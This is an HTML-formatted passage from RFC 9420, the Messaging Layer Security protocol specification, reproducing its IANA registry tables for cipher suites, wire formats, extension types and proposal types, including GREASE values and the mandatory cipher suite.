              <li id="section-17.1-8.3.2.3">D: Indicates that the item is discouraged and <span>SHOULD NOT</span> or <span>MUST NOT</span> be
used. This marking could be used to identify mechanisms that might result in
problems if they are used, such as a weak cryptographic algorithm or a
mechanism that might cause interoperability problems in deployment.<a href="#section-17.1-8.3.2.3">¬∂</a>
</li>
            </ul>
</li>
          <li id="section-17.1-8.4">Reference: The document where this cipher suite is defined<a href="#section-17.1-8.4">¬∂</a>
</li>
        </ul>
<p id="section-17.1-9">Initial contents:<a href="#section-17.1-9">¬∂</a></p>
<span id="name-mls-extension-types-registr"></span><table id="table-6">
          <caption>
<a href="#table-6">Table 6</a>:
<a href="#name-mls-extension-types-registr">MLS Extension Types Registry</a>
          </caption>
<thead>
            <tr>
              <th rowspan="1" colspan="1">Value</th>
              <th rowspan="1" colspan="1">Name</th>
              <th rowspan="1" colspan="1">R</th>
              <th rowspan="1" colspan="1">Ref</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td rowspan="1" colspan="1">0x0000</td>
              <td rowspan="1" colspan="1">RESERVED</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0001</td>
              <td rowspan="1" colspan="1">MLS_128_DHKEMX25519_AES128GCM_SHA256_Ed25519</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0002</td>
              <td rowspan="1" colspan="1">MLS_128_DHKEMP256_AES128GCM_SHA256_P256</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0003</td>
              <td rowspan="1" colspan="1">MLS_128_DHKEMX25519_CHACHA20POLY1305_SHA256_Ed25519</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0004</td>
              <td rowspan="1" colspan="1">MLS_256_DHKEMX448_AES256GCM_SHA512_Ed448</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0005</td>
              <td rowspan="1" colspan="1">MLS_256_DHKEMP521_AES256GCM_SHA512_P521</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0006</td>
              <td rowspan="1" colspan="1">MLS_256_DHKEMX448_CHACHA20POLY1305_SHA512_Ed448</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0007</td>
              <td rowspan="1" colspan="1">MLS_256_DHKEMP384_AES256GCM_SHA384_P384</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0A0A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x1A1A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x2A2A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x3A3A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x4A4A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x5A5A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x6A6A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x7A7A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x8A8A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x9A9A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xAAAA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xBABA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xCACA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xDADA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xEAEA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xF000 - 0xFFFF</td>
              <td rowspan="1" colspan="1">Reserved for Private Use</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
          </tbody>
        </table>
<p id="section-17.1-11">All of the non-GREASE cipher suites use HMAC <span>[<a href="#RFC2104">RFC2104</a>]</span> as their MAC function, with
different hashes per cipher suite.  The mapping of cipher suites to HPKE
primitives <span>[<a href="#RFC9180">RFC9180</a>]</span>, HMAC hash functions, and TLS signature schemes
<span>[<a href="#RFC8446">RFC8446</a>]</span> is as follows:<a href="#section-17.1-11">¬∂</a></p>
<table id="table-7">
          <caption><a href="#table-7">Table 7</a></caption>
<thead>
            <tr>
              <th rowspan="1" colspan="1">Value</th>
              <th rowspan="1" colspan="1">KEM</th>
              <th rowspan="1" colspan="1">KDF</th>
              <th rowspan="1" colspan="1">AEAD</th>
              <th rowspan="1" colspan="1">Hash</th>
              <th rowspan="1" colspan="1">Signature</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td rowspan="1" colspan="1">0x0001</td>
              <td rowspan="1" colspan="1">0x0020</td>
              <td rowspan="1" colspan="1">0x0001</td>
              <td rowspan="1" colspan="1">0x0001</td>
              <td rowspan="1" colspan="1">SHA256</td>
              <td rowspan="1" colspan="1">ed25519</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0002</td>
              <td rowspan="1" colspan="1">0x0010</td>
              <td rowspan="1" colspan="1">0x0001</td>
              <td rowspan="1" colspan="1">0x0001</td>
              <td rowspan="1" colspan="1">SHA256</td>
              <td rowspan="1" colspan="1">ecdsa_secp256r1_sha256</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0003</td>
              <td rowspan="1" colspan="1">0x0020</td>
              <td rowspan="1" colspan="1">0x0001</td>
              <td rowspan="1" colspan="1">0x0003</td>
              <td rowspan="1" colspan="1">SHA256</td>
              <td rowspan="1" colspan="1">ed25519</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0004</td>
              <td rowspan="1" colspan="1">0x0021</td>
              <td rowspan="1" colspan="1">0x0003</td>
              <td rowspan="1" colspan="1">0x0002</td>
              <td rowspan="1" colspan="1">SHA512</td>
              <td rowspan="1" colspan="1">ed448</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0005</td>
              <td rowspan="1" colspan="1">0x0012</td>
              <td rowspan="1" colspan="1">0x0003</td>
              <td rowspan="1" colspan="1">0x0002</td>
              <td rowspan="1" colspan="1">SHA512</td>
              <td rowspan="1" colspan="1">ecdsa_secp521r1_sha512</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0006</td>
              <td rowspan="1" colspan="1">0x0021</td>
              <td rowspan="1" colspan="1">0x0003</td>
              <td rowspan="1" colspan="1">0x0003</td>
              <td rowspan="1" colspan="1">SHA512</td>
              <td rowspan="1" colspan="1">ed448</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0007</td>
              <td rowspan="1" colspan="1">0x0011</td>
              <td rowspan="1" colspan="1">0x0002</td>
              <td rowspan="1" colspan="1">0x0002</td>
              <td rowspan="1" colspan="1">SHA384</td>
              <td rowspan="1" colspan="1">ecdsa_secp384r1_sha384</td>
            </tr>
          </tbody>
        </table>
<p id="section-17.1-13">The hash used for the MLS transcript hash is the one referenced in the
cipher suite name.  In the cipher suites defined above, "SHA256", "SHA384", and
"SHA512" refer, respectively, to the SHA-256, SHA-384, and SHA-512 functions
defined in <span>[<a href="#SHS">SHS</a>]</span>.<a href="#section-17.1-13">¬∂</a></p>
<p id="section-17.1-14">In addition to the general requirements of <a href="#additional-cipher-suites">Section 13.1</a>, future
cipher suites <span>MUST</span> meet the requirements of <a href="#confidentiality-of-sender-data">Section 16.3</a>.<a href="#section-17.1-14">¬∂</a></p>
<p id="section-17.1-15">It is advisable to keep the number of cipher suites low to increase the likelihood
that clients can interoperate in a federated environment. The cipher suites therefore
include only modern, yet well-established algorithms.  Depending on their
requirements, clients can choose between two security levels (roughly 128-bit
and 256-bit). Within the security levels, clients can choose between faster
X25519/X448 curves and curves compliant with FIPS 140-2 for Diffie-Hellman key
negotiations. Clients may also choose ChaCha20Poly1305 or AES-GCM, e.g., for
performance reasons. Since ChaCha20Poly1305 is not listed by FIPS 140-2, it is
not paired with curves compliant with FIPS 140-2. The security level of symmetric
encryption algorithms and hash functions is paired with the security level of
the curves.<a href="#section-17.1-15">¬∂</a></p>
<p id="section-17.1-16">The mandatory-to-implement cipher suite for MLS 1.0 is
<code>MLS_128_DHKEMX25519_AES128GCM_SHA256_Ed25519</code>, which uses
Curve25519 for key exchange, AES-128-GCM for HPKE, HKDF over SHA2-256, and
Ed25519 for signatures.  MLS clients <span>MUST</span> implement this cipher suite.<a href="#section-17.1-16">¬∂</a></p>
</section>
<section id="mls-wire-formats">
        <h3 id="name-mls-wire-formats">
<a href="#section-17.2">17.2. </a><a href="#name-mls-wire-formats">MLS Wire Formats</a>
        </h3>
<p id="section-17.2-1">The "MLS Wire Formats" registry lists identifiers for the types of messages that can be sent in
MLS.  The wire format field is two bytes wide, so the valid wire format values
are in the range 0x0000 to 0xFFFF.<a href="#section-17.2-1">¬∂</a></p>
<p id="section-17.2-2">Template:<a href="#section-17.2-2">¬∂</a></p>
<ul>
<li id="section-17.2-3.1">Value: The numeric value of the wire format<a href="#section-17.2-3.1">¬∂</a>
</li>
          <li id="section-17.2-3.2">Name: The name of the wire format<a href="#section-17.2-3.2">¬∂</a>
</li>
          <li id="section-17.2-3.3">Recommended: Same as in <a href="#mls-cipher-suites">Section 17.1</a><a href="#section-17.2-3.3">¬∂</a>
</li>
          <li id="section-17.2-3.4">Reference: The document where this wire format is defined<a href="#section-17.2-3.4">¬∂</a>
</li>
        </ul>
<p id="section-17.2-4">Initial contents:<a href="#section-17.2-4">¬∂</a></p>
<span id="name-mls-wire-formats-registry"></span><table id="table-8">
          <caption>
<a href="#table-8">Table 8</a>:
<a href="#name-mls-wire-formats-registry">MLS Wire Formats Registry</a>
          </caption>
<thead>
            <tr>
              <th rowspan="1" colspan="1">Value</th>
              <th rowspan="1" colspan="1">Name</th>
              <th rowspan="1" colspan="1">R</th>
              <th rowspan="1" colspan="1">Ref</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td rowspan="1" colspan="1">0x0000</td>
              <td rowspan="1" colspan="1">RESERVED</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0001</td>
              <td rowspan="1" colspan="1">mls_public_message</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0002</td>
              <td rowspan="1" colspan="1">mls_private_message</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0003</td>
              <td rowspan="1" colspan="1">mls_welcome</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0004</td>
              <td rowspan="1" colspan="1">mls_group_info</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0005</td>
              <td rowspan="1" colspan="1">mls_key_package</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xF000 - 0xFFFF</td>
              <td rowspan="1" colspan="1">Reserved for Private Use</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
          </tbody>
        </table>
</section>
<section id="mls-extension-types">
        <h3 id="name-mls-extension-types">
<a href="#section-17.3">17.3. </a><a href="#name-mls-extension-types">MLS Extension Types</a>
        </h3>
<p id="section-17.3-1">The "MLS Extension Types" registry lists identifiers for extensions to the MLS protocol.  The
extension type field is two bytes wide, so valid extension type values are in
the range 0x0000 to 0xFFFF.<a href="#section-17.3-1">¬∂</a></p>
<p id="section-17.3-2">Template:<a href="#section-17.3-2">¬∂</a></p>
<ul>
<li id="section-17.3-3.1">Value: The numeric value of the extension type<a href="#section-17.3-3.1">¬∂</a>
</li>
          <li id="section-17.3-3.2">Name: The name of the extension type<a href="#section-17.3-3.2">¬∂</a>
</li>
          <li id="section-17.3-3.3">
            <p id="section-17.3-3.3.1">Message(s): The messages in which the extension may appear, drawn from the following
list:<a href="#section-17.3-3.3.1">¬∂</a></p>
<ul>
<li id="section-17.3-3.3.2.1">KP: KeyPackage objects<a href="#section-17.3-3.3.2.1">¬∂</a>
</li>
              <li id="section-17.3-3.3.2.2">LN: LeafNode objects<a href="#section-17.3-3.3.2.2">¬∂</a>
</li>
              <li id="section-17.3-3.3.2.3">GC: GroupContext objects<a href="#section-17.3-3.3.2.3">¬∂</a>
</li>
              <li id="section-17.3-3.3.2.4">GI: GroupInfo objects<a href="#section-17.3-3.3.2.4">¬∂</a>
</li>
            </ul>
</li>
          <li id="section-17.3-3.4">Recommended: Same as in <a href="#mls-cipher-suites">Section 17.1</a><a href="#section-17.3-3.4">¬∂</a>
</li>
          <li id="section-17.3-3.5">Reference: The document where this extension is defined<a href="#section-17.3-3.5">¬∂</a>
</li>
        </ul>
<p id="section-17.3-4">Initial contents:<a href="#section-17.3-4">¬∂</a></p>
<span id="name-mls-extension-types-registry"></span><table id="table-9">
          <caption>
<a href="#table-9">Table 9</a>:
<a href="#name-mls-extension-types-registry">MLS Extension Types Registry</a>
          </caption>
<thead>
            <tr>
              <th rowspan="1" colspan="1">Value</th>
              <th rowspan="1" colspan="1">Name</th>
              <th rowspan="1" colspan="1">Message(s)</th>
              <th rowspan="1" colspan="1">R</th>
              <th rowspan="1" colspan="1">Ref</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td rowspan="1" colspan="1">0x0000</td>
              <td rowspan="1" colspan="1">RESERVED</td>
              <td rowspan="1" colspan="1">N/A</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0001</td>
              <td rowspan="1" colspan="1">application_id</td>
              <td rowspan="1" colspan="1">LN</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0002</td>
              <td rowspan="1" colspan="1">ratchet_tree</td>
              <td rowspan="1" colspan="1">GI</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0003</td>
              <td rowspan="1" colspan="1">required_capabilities</td>
              <td rowspan="1" colspan="1">GC</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0004</td>
              <td rowspan="1" colspan="1">external_pub</td>
              <td rowspan="1" colspan="1">GI</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0005</td>
              <td rowspan="1" colspan="1">external_senders</td>
              <td rowspan="1" colspan="1">GC</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0A0A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">KP, GI, LN</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x1A1A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">KP, GI, LN</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x2A2A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">KP, GI, LN</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x3A3A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">KP, GI, LN</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x4A4A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">KP, GI, LN</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x5A5A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">KP, GI, LN</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x6A6A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">KP, GI, LN</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x7A7A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">KP, GI, LN</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x8A8A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">KP, GI, LN</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x9A9A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">KP, GI, LN</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xAAAA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">KP, GI, LN</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xBABA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">KP, GI, LN</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xCACA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">KP, GI, LN</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xDADA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">KP, GI, LN</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xEAEA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">KP, GI, LN</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xF000  - 0xFFFF</td>
              <td rowspan="1" colspan="1">Reserved for Private Use</td>
              <td rowspan="1" colspan="1">N/A</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
          </tbody>
        </table>
</section>
<section id="mls-proposal-types">
        <h3 id="name-mls-proposal-types">
<a href="#section-17.4">17.4. </a><a href="#name-mls-proposal-types">MLS Proposal Types</a>
        </h3>
<p id="section-17.4-1">The "MLS Proposal Types" registry lists identifiers for types of proposals that can be made for
changes to an MLS group.  The extension type field is two bytes wide, so valid
extension type values are in the range 0x0000 to 0xFFFF.<a href="#section-17.4-1">¬∂</a></p>
<p id="section-17.4-2">Template:<a href="#section-17.4-2">¬∂</a></p>
<ul>
<li id="section-17.4-3.1">Value: The numeric value of the proposal type<a href="#section-17.4-3.1">¬∂</a>
</li>
          <li id="section-17.4-3.2">Name: The name of the proposal type<a href="#section-17.4-3.2">¬∂</a>
</li>
          <li id="section-17.4-3.3">Recommended: Same as in <a href="#mls-cipher-suites">Section 17.1</a><a href="#section-17.4-3.3">¬∂</a>
</li>
          <li id="section-17.4-3.4">External: Whether a proposal of this type may be sent by an <code>external</code> sender
(see <a href="#external-proposals">Section 12.1.8</a>)<a href="#section-17.4-3.4">¬∂</a>
</li>
          <li id="section-17.4-3.5">Path Required: Whether a Commit covering a proposal of this type is required
to have its <code>path</code> field populated (see <a href="#commit">Section 12.4</a>)<a href="#section-17.4-3.5">¬∂</a>
</li>
          <li id="section-17.4-3.6">Reference: The document where this extension is defined<a href="#section-17.4-3.6">¬∂</a>
</li>
        </ul>
<p id="section-17.4-4">Initial contents:<a href="#section-17.4-4">¬∂</a></p>
<span id="name-mls-proposal-types-registry"></span><table id="table-10">
          <caption>
<a href="#table-10">Table 10</a>:
<a href="#name-mls-proposal-types-registry">MLS Proposal Types Registry</a>
          </caption>
<thead>
            <tr>
              <th rowspan="1" colspan="1">Value</th>
              <th rowspan="1" colspan="1">Name</th>
              <th rowspan="1" colspan="1">R</th>
              <th rowspan="1" colspan="1">Ext</th>
              <th rowspan="1" colspan="1">Path</th>
              <th rowspan="1" colspan="1">Ref</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td rowspan="1" colspan="1">0x0000</td>
              <td rowspan="1" colspan="1">RESERVED</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0001</td>
              <td rowspan="1" colspan="1">add</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">N</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0002</td>
              <td rowspan="1" colspan="1">update</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">N</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0003</td>
              <td rowspan="1" colspan="1">remove</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0004</td>
              <td rowspan="1" colspan="1">psk</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">N</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0005</td>
              <td rowspan="1" colspan="1">reinit</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">N</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0006</td>
              <td rowspan="1" colspan="1">external_init</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">N</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0007</td>
              <td rowspan="1" colspan="1">group_context_extensions</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0A0A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x1A1A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x2A2A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x3A3A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x4A4A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x5A5A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x6A6A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x7A7A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x8A8A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x9A9A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xAAAA</td>
